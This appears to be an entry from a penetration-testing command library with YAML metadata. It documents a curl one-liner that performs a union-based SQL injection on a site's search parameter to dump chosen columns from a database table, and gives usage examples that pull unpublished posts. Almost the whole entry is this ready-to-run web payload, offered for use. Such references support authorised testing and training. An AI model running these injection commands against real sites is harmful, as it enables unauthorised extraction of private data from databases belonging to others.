---
id: cmd-curl-union-sqli-dump
data: 'curl "https://target.com/search?q='' UNION SELECT $1 FROM $2--" -v'
tags:
  - sqli
  - exfiltration
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:28.598Z'
verified: false
validated: true
submitted: true
---
# curl-union-sqli-dump

## Command

```bash
curl "https://target.com/search?q=' UNION SELECT $1 FROM $2--" -v
```

## Description

Executes a union-based SQL injection to dump data from a specified table and columns.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$1` | Columns to select (e.g., title,content) | Yes |
| `$2` | Target table (e.g., posts) | Yes |
| `--` | SQL comment to terminate query | Yes |
| `-v` | Verbose output | No |

## Examples

### Basic Usage

```bash
curl "https://target.com/search?q=' UNION SELECT title,content FROM posts--" -v
```

### Advanced Usage

```bash
curl "https://target.com/search?q=' UNION SELECT title,content,status FROM posts WHERE status=0--" -v
```

## Expected Output

Search results augmented with dumped database content, such as post titles and unpublished items.

## Related

- [[Exploit SQLi to Dump Unpublished Posts]]
